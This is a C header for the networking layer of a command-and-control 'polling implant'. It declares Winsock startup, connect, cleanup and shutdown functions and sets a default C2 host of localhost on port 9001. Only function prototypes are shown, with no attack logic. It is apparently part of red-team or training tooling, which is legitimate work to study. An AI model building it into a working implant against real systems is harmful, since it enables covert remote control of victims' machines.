#pragma once
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>

#include "debug.h"

#define DEFAULT_C2_HOST L"127.0.0.1"
#define DEFAULT_C2_PORT L"9001"

/**
 * @brief Initializes the Winsock runtime for the polling implant.
 *
 * This function should be called once during implant startup before any poll
 * cycle attempts to connect to the Python task server.
 *
 * @return TRUE on success, or FALSE if Winsock initialization fails.
 */
BOOL NetworkStartup(VOID);

/**
 * @brief Connects to the configured C2 endpoint.
 *
 * This function performs the getaddrinfo, socket, and connect sequence for one
 * polling session. Winsock must already be initialized by calling
 * NetworkStartup.
 *
 * @param host The target C2 host name or IP address.
 * @param port The target C2 port as a wide string.
 * @param sock Receives the connected socket on success.
 *
 * @return TRUE on success, or FALSE if any connection step fails.
 */
BOOL NetworkInit(PCWSTR host, PCWSTR port, SOCKET* sock);

/**
 * @brief Cleans up an active C2 socket after a polling session.
 *
 * @param sock The socket to shutdown and close. May be INVALID_SOCKET.
 *
 * @return VOID
 */
VOID NetworkCleanup(SOCKET sock);

/**
 * @brief Shuts down the Winsock runtime for the polling implant.
 *
 * This function should be called once during implant shutdown after the
 * polling loop has stopped.
 *
 * @return VOID
 */
VOID NetworkShutdown(VOID);